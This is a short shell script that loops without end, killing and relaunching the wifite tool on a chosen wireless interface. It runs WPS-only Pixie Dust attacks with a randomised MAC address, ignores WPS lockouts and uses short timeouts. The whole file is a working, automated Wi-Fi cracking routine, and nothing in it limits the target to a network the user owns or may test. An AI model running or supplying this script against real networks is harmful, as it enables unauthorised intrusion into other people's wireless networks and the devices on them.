#!/bin/sh

if [ "$#" -ne 1 ]; then
	echo "Usage $0 <interface>"
	exit 1
fi

INTERFACE=$1

while (true)
do
killall wifite;
wifite -i $INTERFACE -p 5 --wps-only --random-mac --kill -ic --pixie --ignore-locks --wps-time 30 --wps-fails 1 --wps-timeouts 1;
sleep 1;
done;
